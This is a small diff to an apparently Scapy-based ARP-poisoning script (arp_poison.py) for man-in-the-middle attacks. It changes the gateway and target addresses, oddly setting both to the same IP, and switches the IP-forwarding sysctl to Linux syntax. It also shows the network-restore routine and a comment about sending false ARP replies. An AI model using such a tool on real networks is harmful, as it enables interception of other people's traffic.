@@ -14,8 +14,8 @@ import time
 # USAGE: sudo python2.7 arp_poison.py
 
 # Parameters
-gateway_ip = "192.168.43.1"
-target_ip = "192.168.230.128"
+gateway_ip = "10.41.254.254"
+target_ip = "10.41.254.254"
 packet_count = 1000
 conf.iface = "wlo1"
 conf.verb = 0
@@ -33,7 +33,7 @@ def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
     print("[*] Disabling IP forwarding")
-    os.system("sysctl -w net.inet.ip.forwarding=0")
+    os.system("sysctl -w net.ipv4.ip_forward=0")
     os.kill(os.getpid(), signal.SIGTERM)
 
 # Send false ARP replies to MitM packets
